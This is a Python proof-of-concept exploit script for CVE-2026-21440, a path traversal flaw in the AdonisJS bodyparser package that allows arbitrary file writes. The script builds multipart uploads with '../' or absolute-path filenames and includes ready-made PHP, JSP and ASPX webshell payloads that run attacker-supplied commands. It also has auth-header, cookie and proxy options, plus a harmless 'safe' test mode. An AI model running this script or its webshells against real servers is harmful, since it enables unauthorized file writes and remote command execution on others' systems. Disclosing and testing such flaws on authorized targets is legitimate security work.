"""
Advanced Proof-of-Concept Exploit for CVE-2026-21440
Path Traversal in AdonisJS @adonisjs/bodyparser (Arbitrary File Write)
https://github.com/Ashwesker/Ashwesker-CVE-2026-21440

Features added in this version:
- Multiple traversal depth options
- Random filename support to avoid conflicts
- Support for uploading webshells (PHP, JSP, ASPX)
- Cookie/auth header support
- Proxy support (Burp/ZAP)
- Verbose mode
- Safe test mode (harmless payload)

Vulnerable versions:
- @adonisjs/bodyparser <= 10.1.1
- @adonisjs/bodyparser 11.x prerelease < 11.0.0-next.6

Patched in: 10.1.2+
"""

import requests
import argparse
import random
import string
import sys

def random_string(length=10):
    return ''.join(random.choices(string.ascii_lowercase + string.digits, k=length))

def exploit(args):
    # Build traversal path
    traversal = "../" * args.depth
    if args.absolute:
        traversal = args.absolute

    # Determine filename
    if args.random:
        base_name = f"poc_{random_string(8)}"
    else:
        base_name = args.filename

    # Full malicious filename
    malicious_filename = traversal + base_name

    # Payload content
    if args.shell == "php":
        content = "<?php system($_GET['cmd']); ?>"
        ext = ".php"
    elif args.shell == "jsp":
        content = '<% Runtime.getRuntime().exec(request.getParameter("cmd")); %>'
        ext = ".jsp"
    elif args.shell == "aspx":
        content = '<% @Page Language="C#" %><% System.Diagnostics.Process.Start(Request["cmd"]); %>'
        ext = ".aspx"
    elif args.safe:
        content = "CVE-2026-21440 Safe PoC - This file was written via path traversal\nIf you see this, the server is VULNERABLE!"
        ext = ".txt"
    else:
        content = args.content
        ext = ""

    final_filename = base_name + ext if ext else base_name

    # Multipart file
    files = {
        'file': (malicious_filename, content.encode('utf-8'), 'application/octet-stream')
    }

    # Optional form data
    data = {}
    if args.field:
        for field in args.field:
            if "=" in field:
                k, v = field.split("=", 1)
                data[k] = v

    headers = {}
    if args.cookie:
        headers['Cookie'] = args.cookie
    if args.header:
        for h in args.header:
            if ":" in h:
                k, v = h.split(":", 1)
                headers[k.strip()] = v.strip()

    print("[*] Target:", args.url)
    print("[*] Malicious filename:", malicious_filename)
    print("[*] Target path (estimated):", final_filename)
    print("[*] Payload size:", len(content), "bytes")
    if args.safe:
        print("[*] Running in SAFE mode - harmless payload")

    try:
        response = requests.post(
            args.url,
            files=files,
            data=data,
            headers=headers,
            proxies=args.proxy,
            verify=not args.insecure,
            timeout=15
        )

        print(f"[+] Response status: {response.status_code}")
        if response.status_code in [200, 201, 204]:
            print("[!!!] SUCCESS: File likely written!")
            print(f"[!!!] Try accessing: {args.url.rsplit('/', 1)[0]}/{final_filename}")
            if args.shell:
                print(f"[!!!] Shell command example: ?cmd=whoami (for PHP/JSP)")
        else:
            print("[-] Upload failed or blocked")
            if args.verbose:
                print(response.text[:500])

    except requests.exceptions.RequestException as e:
        print("[-] Request error:", e)


if __name__ == "__main__":
    parser = argparse.ArgumentParser(
        description="CVE-2026-21440 Advanced PoC - AdonisJS Path Traversal",
        epilog="Use responsibly - only on authorized targets!"
    )
    parser.add_argument("url", help="Target upload endpoint URL (e.g. http://target.com/upload)")
    parser.add_argument("-f", "--filename", default="shell.php", help="Destination filename (default: shell.php)")
    parser.add_argument("-c", "--content", help="Custom file content (overrides shell presets)")
    parser.add_argument("--depth", type=int, default=4, help="Traversal depth (../ count, default: 4)")
    parser.add_argument("--absolute", help="Use absolute path (e.g. /var/www/html/shell.php)")
    parser.add_argument("--random", action="store_true", help="Generate random filename to avoid conflicts")
    parser.add_argument("--shell", choices=["php", "jsp", "aspx"], help="Upload predefined webshell")
    parser.add_argument("--safe", action="store_true", help="Upload harmless test file (recommended for testing)")
    parser.add_argument("--cookie", help="Cookie header (e.g. session=abc123)")
    parser.add_argument("--header", action="append", help="Custom headers (e.g. Authorization: Bearer xxx)")
    parser.add_argument("--field", action="append", help="Extra form fields (e.g. csrf_token=abc)")
    parser.add_argument("--proxy", type=lambda p: {"http": p, "https": p}, default=None, help="Proxy (e.g. http://127.0.0.1:8080)")
    parser.add_argument("--insecure", action="store_true", help="Disable SSL verification")
    parser.add_argument("-v", "--verbose", action="store_true", help="Show response body on failure")

    args = parser.parse_args()

    if len(sys.argv) == 1:
        parser.print_help()
        sys.exit(1)

    print("="*70)
    print("CVE-2026-21440 Advanced PoC Exploit - AdonisJS bodyparser Path Traversal")
    print("Educational/authorized testing use only!")
    print("="*70)

    exploit(args)
